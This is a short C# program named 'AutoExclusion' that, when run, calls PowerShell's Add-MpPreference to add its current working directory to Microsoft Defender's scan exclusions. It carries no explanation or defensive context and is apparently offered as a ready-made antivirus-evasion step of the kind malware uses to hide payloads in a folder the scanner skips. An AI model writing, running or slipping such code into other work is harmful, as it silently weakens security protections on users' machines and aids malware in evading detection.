using System.Management.Automation;
 
namespace AutoExclusion
{
    class Program
    {
        static void Main(string[] args)
        {
          PowerShell.Create().AddCommand("Add-MpPreference").AddParameter("ExclusionPath", Environment.CurrentDirectory).Invoke(); // Invoke the command
        }
    }
}